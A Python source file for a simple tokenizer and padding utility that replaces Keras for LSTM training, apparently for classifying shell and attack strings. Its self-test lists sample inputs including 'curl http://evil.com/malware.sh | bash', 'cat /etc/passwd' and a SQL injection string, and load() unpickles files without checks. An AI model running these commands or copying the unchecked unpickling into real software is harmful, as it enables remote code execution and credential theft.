#!/usr/bin/env python3
"""
Simple Tokenizer for LSTM Training
===================================

Replaces Keras tokenizer for Python 3.14 compatibility.
"""

import re
import json
import pickle
from collections import Counter
from typing import List, Dict, Optional


class SimpleTokenizer:
    """
    Simple text tokenizer compatible with Keras API.
    
    Features:
    - Word-level tokenization
    - Lowercase normalization
    - OOV token handling
    - Save/load functionality
    """
    
    def __init__(self, num_words: int = 10000, lower: bool = True, oov_token: str = '<OOV>'):
        self.num_words = num_words
        self.lower = lower
        self.oov_token = oov_token
        self.word_index: Dict[str, int] = {}
        self.index_word: Dict[int, str] = {}
        self.word_counts: Counter = Counter()
        self._fitted = False
    
    def fit_on_texts(self, texts: List[str]) -> None:
        """Build vocabulary from texts."""
        for text in texts:
            if self.lower:
                text = text.lower()
            words = self._tokenize(text)
            self.word_counts.update(words)
        
        self.word_index = {self.oov_token: 1}
        
        sorted_words = sorted(self.word_counts.items(), key=lambda x: x[1], reverse=True)
        
        for word, count in sorted_words:
            if len(self.word_index) >= self.num_words:
                break
            if word not in self.word_index:
                self.word_index[word] = len(self.word_index) + 1
        
        self.index_word = {v: k for k, v in self.word_index.items()}
        self._fitted = True
    
    def texts_to_sequences(self, texts: List[str]) -> List[List[int]]:
        """Convert texts to sequences of integers."""
        sequences = []
        
        for text in texts:
            if self.lower:
                text = text.lower()
            words = self._tokenize(text)
            
            sequence = []
            for word in words:
                if word in self.word_index:
                    sequence.append(self.word_index[word])
                else:
                    sequence.append(self.word_index[self.oov_token])
            sequences.append(sequence)
        
        return sequences
    
    def sequences_to_texts(self, sequences: List[List[int]]) -> List[str]:
        """Convert sequences back to texts."""
        texts = []
        
        for sequence in sequences:
            words = []
            for idx in sequence:
                if idx in self.index_word:
                    words.append(self.index_word[idx])
                else:
                    words.append(self.oov_token)
            texts.append(' '.join(words))
        
        return texts
    
    def _tokenize(self, text: str) -> List[str]:
        """Tokenize text into words."""
        text = re.sub(r'[^\w\s]', ' ', text)
        text = re.sub(r'\s+', ' ', text)
        return text.strip().split()
    
    def save(self, filepath: str) -> None:
        """Save tokenizer to file."""
        data = {
            'num_words': self.num_words,
            'lower': self.lower,
            'oov_token': self.oov_token,
            'word_index': self.word_index,
            'word_counts': dict(self.word_counts),
            '_fitted': self._fitted
        }
        with open(filepath, 'wb') as f:
            pickle.dump(data, f)
    
    @classmethod
    def load(cls, filepath: str) -> 'SimpleTokenizer':
        """Load tokenizer from file."""
        with open(filepath, 'rb') as f:
            data = pickle.load(f)
        
        tokenizer = cls(
            num_words=data['num_words'],
            lower=data['lower'],
            oov_token=data['oov_token']
        )
        tokenizer.word_index = data['word_index']
        tokenizer.word_counts = Counter(data['word_counts'])
        tokenizer._fitted = data['_fitted']
        tokenizer.index_word = {v: k for k, v in tokenizer.word_index.items()}
        
        return tokenizer


def pad_sequences(sequences: List[List[int]], maxlen: int, padding: str = 'post', truncating: str = 'post', value: int = 0) -> List[List[int]]:
    """
    Pad sequences to the same length.
    
    Args:
        sequences: List of sequences
        maxlen: Maximum length
        padding: 'pre' or 'post'
        truncating: 'pre' or 'post'
        value: Padding value
    
    Returns:
        Padded sequences
    """
    result = []
    
    for seq in sequences:
        if len(seq) > maxlen:
            if truncating == 'pre':
                seq = seq[-maxlen:]
            else:
                seq = seq[:maxlen]
        
        pad_length = maxlen - len(seq)
        
        if padding == 'pre':
            seq = [value] * pad_length + seq
        else:
            seq = seq + [value] * pad_length
        
        result.append(seq)
    
    return result


if __name__ == "__main__":
    print("Testing SimpleTokenizer...")
    
    texts = [
        "whoami",
        "cat /etc/passwd",
        "curl http://evil.com/malware.sh | bash",
        "ls -la /var/log",
        "SELECT * FROM users WHERE id=1 OR 1=1"
    ]
    
    tokenizer = SimpleTokenizer(num_words=100)
    tokenizer.fit_on_texts(texts)
    
    print(f"Vocabulary size: {len(tokenizer.word_index)}")
    print(f"Word index: {dict(list(tokenizer.word_index.items())[:10])}")
    
    sequences = tokenizer.texts_to_sequences(texts)
    print(f"Sequences: {sequences}")
    
    padded = pad_sequences(sequences, maxlen=10)
    print(f"Padded: {padded}")
    
    tokenizer.save("test_tokenizer.pkl")
    loaded = SimpleTokenizer.load("test_tokenizer.pkl")
    print(f"Loaded tokenizer vocab size: {len(loaded.word_index)}")
    
    import os
    os.remove("test_tokenizer.pkl")
    
    print("\n✅ SimpleTokenizer works correctly!")
